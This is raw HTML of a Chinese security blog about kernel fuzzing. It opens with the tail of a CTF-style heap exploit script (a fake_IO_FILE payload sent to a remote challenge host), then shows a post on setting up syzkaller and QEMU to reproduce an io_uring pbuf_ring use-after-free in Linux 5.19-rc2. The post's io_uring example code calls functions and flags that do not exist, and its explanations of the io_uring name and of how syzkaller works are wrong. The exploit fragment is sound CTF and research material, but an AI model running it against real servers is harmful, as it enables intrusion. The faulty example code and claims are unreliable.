class="number">0.2</span>)</span><br><span class="line">    add(<span class="number">0x1240</span>,<span class="number">0x208</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x431</span>)+p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span>+p64(heap+<span class="number">0x1350</span>+<span class="number">0x52f0</span>+<span class="number">0x10</span>)*<span class="number">2</span>+<span class="string">&quot;\n&quot;</span>*<span class="number">6</span>) <span class="comment">#4</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload = fake_IO_FILE+p64(flag_addr)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    success(<span class="string">&quot;payload len &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    add(<span class="number">0x420</span>,payload+<span class="string">&quot;\n&quot;</span>) <span class="comment">#13</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x9008</span>)</span><br><span class="line">    add(<span class="number">0x9008</span>)</span><br><span class="line">    add(<span class="number">0x5300</span>)</span><br><span class="line">    add(<span class="number">0x108</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x108</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    pause()</span><br><span class="line">    add(<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    local = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        p = process(challenge)</span><br><span class="line">        <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;120.24.69.11&#x27;</span>,<span class="string">&#x27;12700&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">        ru(<span class="string">&quot;&#123;&quot;</span>)</span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/09/fuzz%E5%B7%A5%E5%85%B7syzkaller%E7%9A%84%E4%BD%BF%E7%94%A8+io_uring%E6%A8%A1%E5%9D%97UAF%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/09/fuzz%E5%B7%A5%E5%85%B7syzkaller%E7%9A%84%E4%BD%BF%E7%94%A8+io_uring%E6%A8%A1%E5%9D%97UAF%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">fuzz工具syzkaller的使用+io_uring模块UAF漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-12-09 23:37:11 / Modified: 23:46:33" itemprop="dateCreated datePublished" datetime="2023-12-09T23:37:11+08:00">2023-12-09</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>32k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>29 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>io_uring 模块 pbuf_ring 漏洞</strong></p>
<p>本篇博客主要对以下文章的内容进行复现： </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://dawnslab.jd.com/linux-5.19-rc2_pbuf_ring_0day/">linux内核io_uring模块pbuf_ring漏洞与提权0day | 京东探索研究院信息安全实验室 (jd.com)</a> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ uname -r</span><br><span class="line"><span class="number">5.19</span><span class="number">.0</span>-rc2</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -kernel &quot;./bzImage&quot; \</span><br><span class="line">    -append &quot;console=ttyS0 qiet loglevel=3 panic=-1 pti=on nokaslr&quot; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd &quot;./rootfs.cpio&quot; \</span><br><span class="line">    -cpu qemu64,+smep,+smap \</span><br><span class="line">    -smp cores=4 -s</span><br></pre></td></tr></table></figure>
<ul>
<li>smep，smap，kaslr，pti</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br></pre></td></tr></table></figure>
<p>内核源码下载：<a target="_blank" rel="noopener" href="https://src.fedoraproject.org/repo/pkgs/kernel/linux-5.19-rc2.tar.xz/">https://src.fedoraproject.org/repo/pkgs/kernel/linux-5.19-rc2.tar.xz/</a></p>
<ul>
<li>该漏洞已经在 <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/ec8516f3b7c40ba7050e6b3a32467e9de451ecdf">5.19-rc8</a> 中被修复 </li>
<li>在编译内核前需要先将修复的部分还原</li>
<li>内核编译选项如下：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_KCOV=y        </span><br><span class="line">CONFIG_VIRTIO_NET=y</span><br><span class="line">CONFIG_CONFIGFS_FS=y</span><br><span class="line">CONFIG_SECURITYFS=y</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 可选</span></span><br><span class="line">CONFIG_DEBUG_INFO=y</span><br><span class="line">CONFIG_KASAN=y</span><br><span class="line">CONFIG_KASAN_INLINE=y</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 关闭</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CONFIG_SLAB_FREELIST_RANDOM is not <span class="built_in">set</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CONFIG_SLAB_FREELIST_HARDENED is not <span class="built_in">set</span></span></span><br></pre></td></tr></table></figure>
<p><strong>io_uring 模块的使用</strong></p>
<p>IO uring（Unified Resource Gestion）是一个 Linux 内核功能，它允许异步 I/O 操作，从而提高系统性能</p>
<ul>
<li>io_uring 的使用案例包括文件读写、网络通信、数据库连接等</li>
<li>io_uring 通过使用用户空间和内核之间的通信机制，允许用户空间应用程序在异步 I/O 操作完成后立即获取结果，而无需等待内核完成磁盘操作或其他内核操作 </li>
</ul>
<p><code>io_uring</code> 的实现仅仅使用了三个 syscall：</p>
<ul>
<li><code>io_uring_setup</code>：设置 <code>io_uring</code> 上下文</li>
<li><code>io_uring_enter</code>：提交并获取完成任务</li>
<li><code>io_uring_register</code>：注册内核用户共享的缓冲区 </li>
</ul>
<p>基于共享内存，io_uring 维护了两个与内核共享的队列：</p>
<ul>
<li>submit 队列：用于存储待提交的 I/O 请求 </li>
<li>completion 队列：用于存储 I/O 请求的完成状态</li>
</ul>
<p>submit 队列中的 I/O 请求与 completion 队列中的 I/O 完成事件之间也没有固定的对应关系，内核会根据 I/O 请求的类型、文件描述符、线程池等信息自动将 I/O 请求分配到合适的队列中 </p>
<ul>
<li>由于 submit / completion 队列属于用户态程序与内核的共享空间</li>
<li>内核只需要读取 submit 队列中的参数就可以执行相应的内核态函数，不需要执行系统调用</li>
<li>当数据执行完毕时，内核又会将返回数据写入 completion 队列</li>
</ul>
<p>使用案例如下：（文件读写）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -o io_uring io_uring.c -luring -fno-stack-protector -no-pie -g</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;io_uring.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> *filename = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">   <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(BUF_SIZE);</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">params</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> *<span class="title">ring</span>;</span></span><br><span class="line">   <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">memset</span>(&amp;params, <span class="number">0</span>, <span class="keyword">sizeof</span>(params));</span><br><span class="line">   params.sq_entries = <span class="number">1</span>;</span><br><span class="line">   params.cq_entries = <span class="number">1</span>;</span><br><span class="line">   params.flags = IORING_FLAG_NONBLOCK;</span><br><span class="line"></span><br><span class="line">   ret = io_uring_setup(&amp;params, &amp;ring); <span class="comment">/* 初始化io_uring */</span></span><br><span class="line">   <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">       perror(<span class="string">&quot;io_uring_setup&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   ret = io_uring_register_files(ring, <span class="number">1</span>, &amp;filename[<span class="number">0</span>]); <span class="comment">/* 打开一个文件 */</span></span><br><span class="line">   <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">       perror(<span class="string">&quot;io_uring_register_files&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> <span class="title">sqe</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   sqe.op = IORING_OP_READ; <span class="comment">/* io_uring命令 */</span></span><br><span class="line">   sqe.fd = <span class="number">0</span>; <span class="comment">/* io_uring文件描述符 */</span></span><br><span class="line">   sqe.off = <span class="number">0</span>; <span class="comment">/* 偏移 */</span></span><br><span class="line">   sqe.addr = buf; <span class="comment">/* 读取地址 */</span></span><br><span class="line">   sqe.len = BUF_SIZE; <span class="comment">/* 长度 */</span></span><br><span class="line"></span><br><span class="line">   ret = io_uring_submit_sqe(ring, &amp;sqe); <span class="comment">/* 底层使用io_uring_enter系统调用 */</span></span><br><span class="line">   <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">       perror(<span class="string">&quot;io_uring_submit_sqe&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span> <span class="title">cqe</span>;</span></span><br><span class="line">   <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">       ret = io_uring_peek_cqe(ring, &amp;cqe);</span><br><span class="line">       <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (errno == EAGAIN) &#123;</span><br><span class="line">               <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           perror(<span class="string">&quot;io_uring_peek_cqe&quot;</span>);</span><br><span class="line">           <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (cqe.err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;read: %s\n&quot;</span>, strerror(cqe.err));</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   io_uring_cancel(ring, <span class="number">0</span>);</span><br><span class="line">   io_uring_queue_exit(ring);</span><br><span class="line">   <span class="built_in">free</span>(buf);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>syzkaller 的安装与使用</strong></p>
<p>syzkaller 是一个用于自动生成内核错误测试用例的 fuzz 工具，它通过利用目标内核的漏洞来生成测试用例，这些测试用例可以用于测试内核的安全性</p>
<p>syzkaller 的主要功能包括自动生成、测试和报告内核错误</p>
<ul>
<li>安装参考文档：<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/linux/setup.md">syzkaller/docs/linux/setup.md at master · google/syzkaller (github.com)</a> </li>
</ul>
<p>syzkaller 使用 Go 语言编写，因此需要获取 go 语言的 tool chain（经过测试，现在最新版的 syzkaller 需要 1.19 版本的 go 环境）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget -c https://dl.google.com/go/go1.19.2.linux-amd64.tar.gz</span><br><span class="line">tar -xf go1.19.2.linux-amd64.tar.gz</span><br><span class="line">sudo cp go/bin/go /usr/local/bin</span><br><span class="line">sudo cp -r go /usr/local</span><br></pre></td></tr></table></figure>
<p>安装 syzkaller：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/google/syzkaller</span><br><span class="line">cd syzkaller</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>编译完成后，在 syzkaller 目录下会出现一个 bin 目录：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bin</span><br><span class="line">├── linux_amd64</span><br><span class="line">│   ├── syz-execprog</span><br><span class="line">│   ├── syz-executor</span><br><span class="line">│   ├── syz-fuzzer</span><br><span class="line">│   └── syz-stress</span><br><span class="line">├── syz-db</span><br><span class="line">├── syz-manager</span><br><span class="line">├── syz-mutate</span><br><span class="line">├── syz-prog2c</span><br><span class="line">├── syz-repro</span><br><span class="line">├── syz-runtest</span><br><span class="line">├── syz-sysgen</span><br><span class="line">└── syz-upgrade</span><br></pre></td></tr></table></figure>
<ul>
<li>如果 <code>syzkaller/bin</code> 目录下，没有 <code>syz-extract</code> 和 <code>syz-sysgen</code> 这两个文件的话，需要执行如下命令编译：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make bin/syz-extract</span><br><span class="line">make bin/syz-sysgen</span><br></pre></td></tr></table></figure>
<p>使用 syzkaller 前，先新建一个 workdir 目录，并新建一个 config 文件用于配置运行所需参数（命名为 test.cfg）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;target&quot;</span>: <span class="string">&quot;linux/amd64&quot;</span>,</span><br><span class="line">	<span class="string">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:56741&quot;</span>,</span><br><span class="line">	<span class="string">&quot;rpc&quot;</span>: <span class="string">&quot;127.0.0.1:0&quot;</span>,</span><br><span class="line">	<span class="string">&quot;sshkey&quot;</span> : <span class="string">&quot;/home/yhellow/pwntest/image/bullseye.id_rsa&quot;</span>, <span class="comment">/* ssh key */</span></span><br><span class="line">	<span class="string">&quot;workdir&quot;</span>: <span class="string">&quot;/home/yhellow/pwntest/workdir&quot;</span>, <span class="comment">/* 本地工作目录 */</span></span><br><span class="line">	<span class="string">&quot;kernel_obj&quot;</span>: <span class="string">&quot;/home/yhellow/pwntest/code/linux-5.19-rc2&quot;</span>, <span class="comment">/* 内核源码位置 */</span></span><br><span class="line">	<span class="string">&quot;syzkaller&quot;</span>: <span class="string">&quot;/home/yhellow/Tools/syzkaller&quot;</span>, <span class="comment">/* syzkaller工具目录 */</span></span><br><span class="line">	<span class="string">&quot;sandbox&quot;</span>: <span class="string">&quot;setuid&quot;</span>,</span><br><span class="line">	<span class="string">&quot;type&quot;</span>: <span class="string">&quot;isolated&quot;</span>,</span><br><span class="line">	<span class="string">&quot;vm&quot;</span>: &#123;</span><br><span class="line">		<span class="string">&quot;targets&quot;</span> : [ <span class="string">&quot;127.0.0.1:10021&quot;</span> ], <span class="comment">/* 虚拟机ip:10021 */</span></span><br><span class="line">		<span class="string">&quot;pstore&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">		<span class="string">&quot;target_dir&quot;</span> : <span class="string">&quot;/root/fuzzdir&quot;</span>, <span class="comment">/* 虚拟机工作目录 */</span></span><br><span class="line">		<span class="string">&quot;target_reboot&quot;</span> : <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在开始 fuzz 之前需要先配置 Imgage 镜像</p>
<p>首先安装 debootstrap，它是 linux 下用来构建一套基本根文件系统的工具：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install debootstrap</span><br></pre></td></tr></table></figure>
<p>之后在 linux 项目目录下键入以下命令，以创建 Debian Stretch Linux image： </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh</span><br><span class="line">chmod +x create-image.sh</span><br><span class="line">./create-image.sh</span><br></pre></td></tr></table></figure>
<p>上述操作全部完成后，执行以下命令来尝试启动：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 2G \</span><br><span class="line">    -smp 2 \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -append &quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot; \</span><br><span class="line">    -drive file=./image/bullseye.img,format=raw \</span><br><span class="line">    -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \</span><br><span class="line">    -net nic,model=e1000 \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -nographic \</span><br><span class="line">    -pidfile vm.pid 2&gt;&amp;1 | tee vm.log</span><br></pre></td></tr></table></figure>
<p>然后测试 ssh 能否成功工作，因为 syzkaller 会用到 ssh：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">➜  pwntest ssh -i ./image/bullseye.id_rsa -p <span class="number">10021</span> -o <span class="string">&quot;StrictHostKeyChecking no&quot;</span> root@localhost</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!</span><br><span class="line"><span class="function">Someone could be eavesdropping on you right <span class="title">now</span> <span class="params">(man-in-the-middle attack)</span>!</span></span><br><span class="line"><span class="function">It is also possible that a host key has just been changed.</span></span><br><span class="line"><span class="function">The fingerprint <span class="keyword">for</span> the ECDSA key sent by the remote host is</span></span><br><span class="line"><span class="function">SHA256:jAtZl0868l4KSK75H0o0bE+7bXydTB4iDwkp68qT2Dk.</span></span><br><span class="line"><span class="function">Please contact your system administrator.</span></span><br><span class="line"><span class="function">Add correct host key in /home/yhellow/.ssh/known_hosts to get rid of <span class="keyword">this</span> message.</span></span><br><span class="line"><span class="function">Offending ECDSA key in /home/yhellow/.ssh/known_hosts:1</span></span><br><span class="line"><span class="function">  remove with:</span></span><br><span class="line"><span class="function">  ssh-keygen -f &quot;/home/yhellow/.ssh/known_hosts&quot; -R &quot;[localhost]:10021&quot;</span></span><br><span class="line"><span class="function">Password authentication is disabled to avoid man-in-the-middle attacks.</span></span><br><span class="line"><span class="function">Keyboard-interactive authentication is disabled to avoid man-in-the-middle attacks.</span></span><br><span class="line"><span class="function">Linux syzkaller 5.19.2 #10 SMP PREEMPT_DYNAMIC Thu Dec 7 02:17:49 CST 2023 x86_64</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">The programs included with the Debian GNU/Linux system are <span class="built_in">free</span> software</span>;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described in the</span><br><span class="line">individual files in /usr/share/doc<span class="comment">/*/copyright.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="comment">permitted by applicable law.</span></span><br><span class="line"><span class="comment">A valid context for root could not be obtained.</span></span><br><span class="line"><span class="comment">Last login: Wed Dec  6 18:22:26 2023</span></span><br><span class="line"><span class="comment">root@syzkaller:~# </span></span><br></pre></td></tr></table></figure>
<p>如果遇到以下报错可以参考如下的解决方案：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kex_exchange_identification: read: Connection reset by peer</span><br></pre></td></tr></table></figure>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/issues/3935">kex_exchange_identification：阅读：对等节点重置连接 ·期刊 #3935 ·谷歌/Syzkaller (github.com)</a> </li>
</ul>
<p>先启动内核，后启动 fuzz：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">➜  pwntest /home/yhellow/Tools/syzkaller/bin/syz-manager -config=test.cfg</span><br><span class="line">2023/12/07 02:53:47 loading corpus...</span><br><span class="line">2023/12/07 02:53:47 serving http on http://127.0.0.1:56741</span><br><span class="line">2023/12/07 02:53:47 serving rpc on tcp://127.0.0.1:39647</span><br><span class="line">2023/12/07 02:53:47 booting test machines...</span><br><span class="line">2023/12/07 02:53:47 wait for the connection from test machine...</span><br><span class="line">2023/12/07 02:54:01 machine check:</span><br><span class="line">2023/12/07 02:54:01 syscalls                : 2123/4451</span><br><span class="line">2023/12/07 02:54:01 code coverage           : enabled</span><br><span class="line">2023/12/07 02:54:01 comparison tracing      : CONFIG_KCOV_ENABLE_COMPARISONS is not enabled</span><br><span class="line">2023/12/07 02:54:01 extra coverage          : enabled</span><br><span class="line">2023/12/07 02:54:01 delay kcov mmap         : enabled</span><br><span class="line">2023/12/07 02:54:01 setuid sandbox          : enabled</span><br><span 